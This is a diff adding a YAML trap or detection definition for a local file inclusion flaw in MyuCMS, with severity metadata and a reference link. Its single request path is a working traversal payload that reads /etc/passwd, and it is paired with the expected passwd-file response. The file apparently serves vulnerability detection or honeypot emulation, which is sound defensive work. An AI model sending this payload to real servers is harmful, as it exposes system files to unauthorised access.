@@ -1,0 +1,25 @@
+id: myucms-lfr
+info:
+  name: MyuCMS - Local File Inclusion
+  author: princechaddha
+  description: MyuCMS is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://blog.csdn.net/yalecaltech/article/details/104908257
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: myucms,lfi
+traps:
+- request:
+    method: GET
+    path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
